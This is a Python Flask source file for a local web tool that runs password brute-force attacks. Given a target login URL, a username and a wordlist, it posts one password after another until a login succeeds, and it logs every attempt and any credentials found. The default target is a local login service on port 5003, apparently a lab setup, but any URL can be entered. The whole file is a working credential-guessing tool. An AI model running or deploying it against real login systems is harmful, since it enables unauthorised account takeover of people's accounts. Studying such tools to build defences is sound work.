import os
import sys
import time
import requests
import webbrowser
from datetime import datetime
from threading import Timer
from flask import Flask, render_template, request, jsonify

VERSION = "1.0.0"
LOG_DIR = "logs"

# Ensure the log directory exists
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# --- EXECUTABLE PATH HANDLING ---
if getattr(sys, 'frozen', False):
    base_path = sys._MEIPASS
    template_folder = os.path.join(base_path, 'templates')
    static_folder = os.path.join(base_path, 'static')
    app = Flask(__name__, template_folder=template_folder, static_folder=static_folder)
else:
    app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', version=VERSION)

@app.route('/start_attack', methods=['POST'])
def start_attack():
    data = request.json
    target_url = data.get('url', 'http://127.0.0.1:5003/login')
    username = data.get('username', 'admin')
    passwords = data.get('wordlist', '').split('\n')
    
    attempts = []
    found_pw = None
    
    # Prepare Log File
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_filename = os.path.join(LOG_DIR, f"attack_{timestamp}.txt")
    
    try:
        with open(log_filename, "w") as log_file:
            log_file.write(f"--- BRUTE FORCE SESSION {timestamp} ---\n")
            log_file.write(f"Target URL: {target_url}\n")
            log_file.write(f"Target Username: {username}\n")
            log_file.write("-" * 40 + "\n")

            for pwd in passwords:
                pwd = pwd.strip()
                if not pwd: continue
                
                try:
                    payload = {"username": username, "password": pwd}
                    # We target the Login System on Port 5003
                    response = requests.post(target_url, json=payload, timeout=3)
                    
                    status = "SUCCESS" if response.status_code == 200 else "FAILED"
                    
                    attempts.append({"password": pwd, "status": status})
                    log_file.write(f"Attempt: {pwd} | Result: {status}\n")
                    
                    if status == "SUCCESS":
                        found_pw = pwd
                        log_file.write(f"\n[!] CREDENTIALS FOUND: {found_pw}\n")
                        break
                        
                    # Slow down slightly to avoid overwhelming the target
                    time.sleep(0.05)
                    
                except Exception as e:
                    error_msg = f"ERROR during attempt [{pwd}]: {str(e)}"
                    log_file.write(error_msg + "\n")
                    return jsonify({"success": False, "message": "Target Unreachable"}), 500

        return jsonify({
            "success": True, 
            "attempts": attempts, 
            "found": found_pw,
            "log_file": log_filename
        })
    except Exception as e:
        return jsonify({"success": False, "message": f"Log creation failed: {str(e)}"}), 500

def open_browser():
    webbrowser.open_new('http://127.0.0.1:5007/')

if __name__ == '__main__':
    Timer(1, open_browser).start()
    app.run(host='127.0.0.1', port=5007, debug=False)
